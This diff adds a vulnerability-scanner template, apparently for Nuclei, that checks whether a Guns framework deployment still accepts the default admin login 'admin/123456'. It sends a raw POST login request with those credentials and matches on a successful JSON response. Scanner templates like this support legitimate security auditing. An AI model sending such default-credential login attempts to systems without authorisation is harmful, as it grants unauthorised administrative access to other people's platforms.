@@ -1,0 +1,38 @@
+id: guns-login-weak-pass
+
+info:
+  name: Guns Login Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Guns is a modern Java application development framework based on Spring Boot2. This vulnerability arises due to the use of default credentials (admin/123456), allowing attackers to gain administrative access to the platform.
+  tags: default-password
+  reference:
+    - https://gitee.com/stylefeng/guns
+
+http:
+  - raw:
+      - |
+        POST /login?jstime=1659188893835 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        username=admin&password=123456
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"code":200,'
+          - '"success":true'
+          - '"message":"\u8BF7\u6C42\u6210\u529F",'
+        part: body
+      - type: word
+        words:
+          - application/json
+        part: header
